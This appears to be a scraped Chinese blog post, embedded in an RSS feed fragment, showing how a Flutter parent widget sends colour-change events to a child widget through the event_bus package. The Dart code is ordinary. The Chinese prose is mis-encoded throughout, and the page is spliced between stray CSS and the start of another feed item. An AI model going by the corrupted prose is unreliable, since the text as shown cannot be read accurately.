a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"â€¢";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><h2 data-id="heading-0">1. æ•ˆæœé¢„è§ˆ</h2>
<p>åœ¨ Flutter åº”ç”¨å¼€å‘ä¸­ï¼Œç»„ä»¶é—´çš„é€šä¿¡æ˜¯ä¸€ä¸ªå¸¸è§ä¸”é‡è¦çš„éœ€æ±‚ã€‚å½“æ¶‰åŠåˆ°çˆ¶å­ç»„ä»¶ä¹‹é—´å¤æ‚çš„äº¤äº’æ—¶ï¼Œä½¿ç”¨äº‹ä»¶æ€»çº¿ï¼ˆEvent Busï¼‰å¯ä»¥æœ‰æ•ˆåœ°å®ç°è§£è€¦å’Œçµæ´»çš„æ¶ˆæ¯ä¼ é€’ã€‚æœ¬æ–‡å°†é€šè¿‡ä¸€æ®µå…·ä½“çš„ä»£ç ï¼Œè¯¦ç»†ä»‹ç»å¦‚ä½•åœ¨ Flutter ä¸­åˆ©ç”¨äº‹ä»¶æ€»çº¿å®ç°çˆ¶å­ç»„ä»¶ä¹‹é—´çš„é€šä¿¡ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebfa70468af644018b55aeea80cdbdde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bmP5aSa5aSa:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766364053&amp;x-signature=lY2mGdzxw4VH3CvdYz6bcOCybFU%3D" alt="æ•ˆæœé¢„è§ˆ" loading="lazy"/></p>
<h2 data-id="heading-1">2. å®‰è£…æ’ä»¶</h2>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">event_bus:</span> <span class="hljs-string">^2.0.0</span>
</code></pre>
<p>åˆ›å»ºeventBus.dartæ–‡ä»¶ï¼Œå†™å…¥ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:event_bus/event_bus.dart'</span>;

EventBus eventBus = EventBus();

<span class="hljs-comment">/// <span class="markdown">é€šçŸ¥æµ‹è¯•</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BusNotificationTest</span> </span>{
  <span class="hljs-built_in">int</span> index;
  BusNotificationTest(<span class="hljs-keyword">this</span>.index);
}
</code></pre>
<h2 data-id="heading-2">3. ç»“æ„åˆ†æ</h2>
<p>è¿™æ®µä»£ç å±•ç¤ºäº†å¦‚ä½•åœ¨ Flutter ä¸­é€šè¿‡äº‹ä»¶æ€»çº¿å®ç°çˆ¶å­ç»„ä»¶ä¹‹é—´çš„é€šä¿¡ï¼Œå…·ä½“åŠŸèƒ½ä¸ºï¼šåœ¨çˆ¶ç»„ä»¶EventBusParentPageä¸­ï¼Œç”¨æˆ·ç‚¹å‡»æŒ‰é’®åï¼Œä¼šè§¦å‘ä¸€ä¸ªé€šçŸ¥äº‹ä»¶ï¼Œå­ç»„ä»¶EventBusChildPageç›‘å¬è¯¥äº‹ä»¶ï¼Œå¹¶æ ¹æ®äº‹ä»¶æºå¸¦çš„ä¿¡æ¯æ”¹å˜è‡ªèº«çš„èƒŒæ™¯é¢œè‰²ã€‚</p>
<ol>
<li>çˆ¶ç»„ä»¶ï¼šEventBusParentPage</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">äº‹ä»¶Busé€šçŸ¥çˆ¶ç±»</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventBusParentPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">const</span> EventBusParentPage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  EventBusParentPageState createState() =&gt; EventBusParentPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventBusParentPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">EventBusParentPage</span>&gt; </span>{
  <span class="hljs-comment">/// <span class="markdown">é¢œè‰²ç´¢å¼•</span></span>
  <span class="hljs-built_in">int</span> index = <span class="hljs-number">0</span>;

  <span class="hljs-comment">/// <span class="markdown">é€šçŸ¥å˜è‰²</span></span>
  <span class="hljs-keyword">void</span> handleColorChange() {
    index++;
    <span class="hljs-keyword">if</span> (index &gt; <span class="hljs-number">2</span>) {
      index = <span class="hljs-number">0</span>;
    }
    eventBus.fire(BusNotificationTest(index));
  }

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Column(
      children: [
        Expanded(
            child: Container(
                alignment: Alignment.center,
                decoration: <span class="hljs-keyword">const</span> BoxDecoration(color: Colors.white),
                child: TextButton(
                    onPressed: handleColorChange,
                    child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'ç‚¹å‡»å˜è‰²'</span>,
                        style: TextStyle(color: Colors.black, fontSize: <span class="hljs-number">20</span>))))),
        <span class="hljs-keyword">const</span> EventBusChildPage()
      ],
    );
  }
}
</code></pre>
<ul>
<li>ç»„ä»¶å®šä¹‰ï¼š
<ul>
<li>EventBusParentPageæ˜¯ä¸€ä¸ªæœ‰çŠ¶æ€ç»„ä»¶ï¼Œé€šè¿‡createStateæ–¹æ³•è¿”å›EventBusParentPageStateå®ä¾‹ï¼Œç”¨äºç®¡ç†ç»„ä»¶çŠ¶æ€å’Œæ„å»º UIã€‚</li>
</ul>
</li>
<li>çŠ¶æ€å˜é‡ï¼š
<ul>
<li>indexï¼šä¸€ä¸ªæ•´å‹å˜é‡ï¼Œç”¨äºè®°å½•é¢œè‰²ç´¢å¼•ï¼Œåˆå§‹å€¼ä¸º 0ã€‚è¿™ä¸ªç´¢å¼•å°†å†³å®šå­ç»„ä»¶æœ€ç»ˆæ˜¾ç¤ºçš„é¢œè‰²ã€‚</li>
</ul>
</li>
<li>äº‹ä»¶å¤„ç†æ–¹æ³•ï¼š
<ul>
<li>handleColorChangeï¼šå½“ç”¨æˆ·ç‚¹å‡»çˆ¶ç»„ä»¶ä¸­çš„æŒ‰é’®æ—¶ï¼Œè¯¥æ–¹æ³•è¢«è°ƒç”¨ã€‚å®ƒé¦–å…ˆå°†indexå€¼å¢åŠ  1ï¼Œå¦‚æœindexè¶…è¿‡ 2ï¼Œåˆ™é‡ç½®ä¸º 0ã€‚ç„¶åï¼Œé€šè¿‡äº‹ä»¶æ€»çº¿eventBusè§¦å‘ä¸€ä¸ªBusNotificationTestç±»å‹çš„äº‹ä»¶ï¼Œå¹¶å°†å½“å‰çš„indexå€¼ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¯¥äº‹ä»¶ã€‚è¿™é‡Œçš„eventBusåº”è¯¥æ˜¯åœ¨å…¨å±€æˆ–åˆé€‚çš„ä½œç”¨åŸŸä¸­å®šä¹‰çš„äº‹ä»¶æ€»çº¿å®ä¾‹ï¼ŒBusNotificationTeståˆ™æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„äº‹ä»¶ç±»ï¼Œç”¨äºæºå¸¦æ•°æ®ï¼ˆè¿™é‡Œæ˜¯é¢œè‰²ç´¢å¼•ï¼‰ã€‚</li>
</ul>
</li>
<li>æ„å»º UIï¼š
<ul>
<li>åœ¨buildæ–¹æ³•ä¸­ï¼Œçˆ¶ç»„ä»¶æ„å»ºäº†ä¸€ä¸ªå‚ç›´æ–¹å‘çš„Columnå¸ƒå±€ã€‚</li>
<li>ç¬¬ä¸€ä¸ªå­ç»„ä»¶æ˜¯ä¸€ä¸ªExpandedåŒ…è£¹çš„Containerï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªTextButtonã€‚æŒ‰é’®çš„æ–‡æœ¬ä¸º â€œç‚¹å‡»å˜è‰²â€ï¼Œå½“æŒ‰é’®è¢«ç‚¹å‡»æ—¶ï¼Œä¼šè°ƒç”¨handleColorChangeæ–¹æ³•ã€‚Containerçš„èƒŒæ™¯é¢œè‰²è®¾ç½®ä¸ºç™½è‰²ã€‚</li>
<li>ç¬¬äºŒä¸ªå­ç»„ä»¶æ˜¯EventBusChildPageï¼Œè¿™æ˜¯éœ€è¦æ¥æ”¶äº‹ä»¶é€šçŸ¥çš„å­ç»„ä»¶ï¼Œé€šè¿‡constå…³é”®å­—åˆ›å»ºï¼Œæ„å‘³ç€å®ƒæ˜¯ä¸€ä¸ªä¸å¯å˜çš„ç»„ä»¶å®ä¾‹ã€‚</li>
</ul>
</li>
</ul>
<ol start="2">
<li>å­ç»„ä»¶ï¼šEventBusChildPage</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">äº‹ä»¶Busé€šçŸ¥å­ç±»</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventBusChildPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">const</span> EventBusChildPage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  EventBusChildPageState createState() =&gt; EventBusChildPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventBusChildPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">EventBusChildPage</span>&gt; </span>{
  <span class="hljs-comment">/// <span class="markdown">é¢œè‰²åˆ—è¡¨</span></span>
  <span class="hljs-built_in">List</span>&lt;Color&gt; colorList = [Colors.red, Colors.yellow, Colors.blue];

  <span class="hljs-comment">/// <span class="markdown">åˆ·æ–°ç›‘å¬</span></span>
  <span class="hljs-keyword">late</span> StreamSubscription&lt;BusNotificationTest&gt; eventBusExample;

  <span class="hljs-comment">/// <span class="markdown">èƒŒæ™¯é¢œè‰²</span></span>
  <span class="hljs-keyword">late</span> Color bgColor;

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    bgColor = colorList[<span class="hljs-number">0</span>];
    <span class="hljs-comment">// ç›‘å¬é¢œè‰²ç´¢å¼•å˜åŒ–</span>
    eventBusExample = eventBus.<span class="hljs-keyword">on</span>&lt;BusNotificationTest&gt;().listen((event) {
      setState(() {
        bgColor = colorList[event.index];
      });
    });
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    eventBusExample.cancel();
    <span class="hljs-keyword">super</span>.dispose();
  }

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> SizedBox(
        width: MediaQuery.of(context).size.width,
        height: MediaQuery.of(context).size.height / <span class="hljs-number">2</span>,
        child: Container(color: bgColor, child: <span class="hljs-keyword">null</span>));
  }
}
</code></pre>
<ul>
<li>ç»„ä»¶å®šä¹‰ï¼š
<ul>
<li>EventBusChildPageåŒæ ·æ˜¯ä¸€ä¸ªæœ‰çŠ¶æ€ç»„ä»¶ï¼Œå…¶createStateæ–¹æ³•è¿”å›EventBusChildPageStateå®ä¾‹ã€‚</li>
</ul>
</li>
<li>çŠ¶æ€å˜é‡
<ul>
<li>colorListï¼šä¸€ä¸ªåŒ…å«ä¸‰ç§é¢œè‰²ï¼ˆçº¢è‰²ã€é»„è‰²ã€è“è‰²ï¼‰çš„åˆ—è¡¨ï¼Œç”¨äºå­˜å‚¨å¯ä¾›é€‰æ‹©çš„èƒŒæ™¯é¢œè‰²ã€‚</li>
<li>eventBusExampleï¼šä¸€ä¸ªStreamSubscriptionç±»å‹çš„å˜é‡ï¼Œç”¨äºè®¢é˜…äº‹ä»¶æ€»çº¿eventBusä¸Šçš„BusNotificationTestç±»å‹çš„äº‹ä»¶ã€‚è¿™é‡Œä½¿ç”¨lateå…³é”®å­—å£°æ˜ï¼Œæ„å‘³ç€åœ¨initStateæ–¹æ³•ä¸­ä¼šå¯¹å…¶è¿›è¡Œåˆå§‹åŒ–ã€‚</li>
<li>bgColorï¼šç”¨äºå­˜å‚¨å­ç»„ä»¶å½“å‰çš„èƒŒæ™¯é¢œè‰²ï¼Œåˆå§‹å€¼ä¸ºcolorListä¸­çš„ç¬¬ä¸€ä¸ªé¢œè‰²ï¼ˆçº¢è‰²ï¼‰ï¼ŒåŒæ ·ä½¿ç”¨lateå…³é”®å­—å£°æ˜ï¼Œåœ¨initStateæ–¹æ³•ä¸­åˆå§‹åŒ–ã€‚</li>
</ul>
</li>
<li>ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼š
<ul>
<li>initStateï¼šåœ¨ç»„ä»¶æ’å…¥åˆ° Widget æ ‘æ—¶è°ƒç”¨ã€‚é¦–å…ˆè°ƒç”¨çˆ¶ç±»çš„initStateæ–¹æ³•ï¼Œç„¶ååˆå§‹åŒ–bgColorä¸ºcolorListä¸­çš„ç¬¬ä¸€ä¸ªé¢œè‰²ã€‚æ¥ç€ï¼Œé€šè¿‡eventBus.on().listenæ–¹æ³•ï¼Œè®¢é˜…äº‹ä»¶æ€»çº¿ä¸Šçš„BusNotificationTestäº‹ä»¶ã€‚å½“æ¥æ”¶åˆ°è¯¥äº‹ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œå›è°ƒå‡½æ•°ï¼Œåœ¨å›è°ƒå‡½æ•°ä¸­ï¼Œé€šè¿‡setStateæ–¹æ³•æ›´æ–°bgColorä¸ºcolorListä¸­å¯¹åº”ç´¢å¼•çš„é¢œè‰²ã€‚è¿™é‡Œçš„event.indexå°±æ˜¯çˆ¶ç»„ä»¶è§¦å‘äº‹ä»¶æ—¶ä¼ é€’è¿‡æ¥çš„é¢œè‰²ç´¢å¼•ã€‚</li>
<li>disposeï¼šå½“ç»„ä»¶ä» Widget æ ‘ä¸­ç§»é™¤æ—¶è°ƒç”¨ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œè°ƒç”¨eventBusExample.cancel()å–æ¶ˆå¯¹äº‹ä»¶æ€»çº¿çš„è®¢é˜…ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼ï¼Œç„¶åè°ƒç”¨çˆ¶ç±»çš„disposeæ–¹æ³•ã€‚</li>
</ul>
</li>
<li>æ„å»º UIï¼š
<ul>
<li>åœ¨buildæ–¹æ³•ä¸­ï¼Œå­ç»„ä»¶æ„å»ºäº†ä¸€ä¸ªSizedBoxï¼Œå…¶å®½åº¦ä¸ºå±å¹•å®½åº¦ï¼Œé«˜åº¦ä¸ºå±å¹•é«˜åº¦çš„ä¸€åŠã€‚åœ¨SizedBoxå†…éƒ¨æ˜¯ä¸€ä¸ªContainerï¼Œå…¶èƒŒæ™¯é¢œè‰²ç”±bgColorå†³å®šã€‚å½“bgColorå› æ¥æ”¶åˆ°äº‹ä»¶é€šçŸ¥è€Œæ”¹å˜æ—¶ï¼ŒContainerçš„èƒŒæ™¯é¢œè‰²ä¹Ÿä¼šç›¸åº”æ”¹å˜ï¼Œä»è€Œå®ç°äº†æ ¹æ®çˆ¶ç»„ä»¶é€šçŸ¥åŠ¨æ€æ›´æ–°å­ç»„ä»¶ UI çš„æ•ˆæœã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-3">3. æ€»ç»“</h2>
<p>é€šè¿‡ä¸Šè¿°ä»£ç ï¼Œæˆ‘ä»¬æ¸…æ™°åœ°çœ‹åˆ°äº†å¦‚ä½•åœ¨ Flutter ä¸­åˆ©ç”¨äº‹ä»¶æ€»çº¿å®ç°çˆ¶å­ç»„ä»¶ä¹‹é—´çš„é€šä¿¡ã€‚çˆ¶ç»„ä»¶é€šè¿‡è§¦å‘äº‹ä»¶å¹¶æºå¸¦ç›¸å…³æ•°æ®ï¼Œå­ç»„ä»¶é€šè¿‡è®¢é˜…äº‹ä»¶æ€»çº¿å¹¶æ ¹æ®æ¥æ”¶åˆ°çš„äº‹ä»¶æ•°æ®æ›´æ–°è‡ªèº«çŠ¶æ€å’Œ UIã€‚</p>
<p>è¿™ç§æ–¹å¼æœ‰æ•ˆåœ°è§£è€¦äº†çˆ¶å­ç»„ä»¶ä¹‹é—´çš„ç›´æ¥ä¾èµ–å…³ç³»ï¼Œæé«˜äº†ä»£ç çš„å¯ç»´æŠ¤æ€§å’Œæ‰©å±•æ€§ã€‚åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œå½“å­˜åœ¨å¤šä¸ªç»„ä»¶ä¹‹é—´å¤æ‚çš„äº¤äº’æ—¶ï¼Œäº‹ä»¶æ€»çº¿æ˜¯ä¸€ç§éå¸¸å¼ºå¤§ä¸”çµæ´»çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<hr/>
<blockquote>
<p>æœ¬æ¬¡åˆ†äº«å°±åˆ°è¿™å„¿å•¦ï¼Œæˆ‘æ˜¯é¹å¤šå¤šï¼Œæ·±è€•å‰ç«¯çš„æŠ€æœ¯åˆ›ä½œè€…ï¼Œå¦‚æœæ‚¨çœ‹äº†è§‰å¾—æœ‰å¸®åŠ©ï¼Œæ¬¢è¿è¯„è®ºï¼Œå…³æ³¨ï¼Œç‚¹èµï¼Œè½¬å‘ï¼Œæˆ‘ä»¬ä¸‹æ¬¡è§~</p>
</blockquote>
<p>PSï¼šåœ¨æœ¬é¡µæŒ‰F12ï¼Œåœ¨consoleä¸­è¾“å…¥document.getElementsByClassName('panel-btn')[0].click();æœ‰æƒŠå–œå“¦~</p>
<p><code>å¾€æœŸæ–‡ç« </code></p>
<ul>
<li><a href="https://juejin.cn/post/7582808491582619684" target="_blank" title="https://juejin.cn/post/7582808491582619684">Flutterè¾“å…¥æ¡†TextFieldçš„å±æ€§ä¸å®æˆ˜ç”¨æ³•å…¨é¢è§£æ+ç¤ºä¾‹</a></li>
<li><a href="https://juejin.cn/post/7581693431740448831" target="_blank" title="https://juejin.cn/post/7581693431740448831">Flutterè‡ªå®šä¹‰æ—¥å†table_calendarå®Œå…¨æŒ‡å—+æ¡ˆä¾‹</a></li>
<li><a href="https://juejin.cn/post/7580389111921786943" target="_blank" title="https://juejin.cn/post/7580389111921786943">flutter-å±å¹•è‡ªé€‚åº”æ’ä»¶flutter_screenutilæ•™ç¨‹å…¨æŒ‡å—</a></li>
<li><a href="https://juejin.cn/post/7579101504289882166" target="_blank" title="https://juejin.cn/post/7579101504289882166">flutter-ä½¿ç”¨url_launcheræ‰“å¼€é“¾æ¥/åº”ç”¨/çŸ­ä¿¡/é‚®ä»¶å’Œè¯„åˆ†è·³è½¬ç­‰</a></li>
<li><a href="https://juejin.cn/post/7570923924365230143" target="_blank" title="https://juejin.cn/post/7570923924365230143">flutterå›¾ç‰‡é€‰æ‹©åº“multi_image_picker_pluså’Œimage_pickerçš„å¯¹æ¯”å’Œä½¿ç”¨è§£æ</a></li>
<li><a href="https://juejin.cn/post/7568136081302978623" target="_blank" title="https://juejin.cn/post/7568136081302978623">è§£é”flutterå¼¹çª—æ–°å§¿åŠ¿ï¼šdialog-flutter_smart_dialogæ’ä»¶è§£è¯»+æ¡ˆä¾‹</a></li>
<li><a href="https://juejin.cn/post/7559089440901545999" target="_blank" title="https://juejin.cn/post/7559089440901545999">flutter-åˆ‡æ¢çŠ¶æ€æ˜¾ç¤ºä¸åŒç»„ä»¶10ç§å®ç°æ–¹æ¡ˆå…¨è§£æ</a></li>
<li><a href="https://juejin.cn/post/7555079970491318308" target="_blank" title="https://juejin.cn/post/7555079970491318308">flutter-è¯¦è§£æ§åˆ¶ç»„ä»¶æ˜¾ç¤ºçš„ä¸¤ç§æ–¹å¼Offstageä¸Visibility</a></li>
<li><a href="https://juejin.cn/post/7535358416182788122" target="_blank" title="https://juejin.cn/post/7535358416182788122">flutter-ä½¿ç”¨AnimatedDefaultTextStyleå®ç°æ–‡æœ¬åŠ¨ç”»</a></li>
<li><a href="https://juejin.cn/post/7537339432291434496" target="_blank" title="https://juejin.cn/post/7537339432291434496">flutter-ä½¿ç”¨SafeAreaç»„ä»¶å¤„ç†å„æœºå‹çš„å®‰å…¨è·ç¦»</a></li>
<li><a href="https://juejin.cn/spost/7537593417099149321" target="_blank" title="https://juejin.cn/spost/7537593417099149321">flutter-å®ç°æ¸å˜è‰²è¾¹æ¡†èƒŒæ™¯ä»¥åŠæ¸å˜è‰²æ–‡å­—</a></li>
<li><a href="https://juejin.cn/post/7543474419240370185" target="_blank" title="https://juejin.cn/post/7543474419240370185">flutter-ä½¿ç”¨confettiåˆ¶ä½œç‚«é…·çº¸å±‘çˆ†ç‚¸ç²’å­åŠ¨ç”»</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯è·¨é¡µé¢é€šè®¯ç»ˆææŒ‡å—â‘¥ï¼šSharedWorker ç”¨æ³•å…¨è§£æ]]></title>    <link>https://juejin.cn/post/7583574154341072905</link>    <guid>https://juejin.cn/post/7583574154341072905</guid>    <pubDate>2025-12-14T19:52:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583574154341072905" data-draft-id="7576369868418875428" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯è·¨é¡µé¢é€šè®¯ç»ˆææŒ‡å—â‘¥ï¼šSharedWorker ç”¨æ³•å…¨è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-14T19:52:22.000Z"/> <meta itemprop="image" 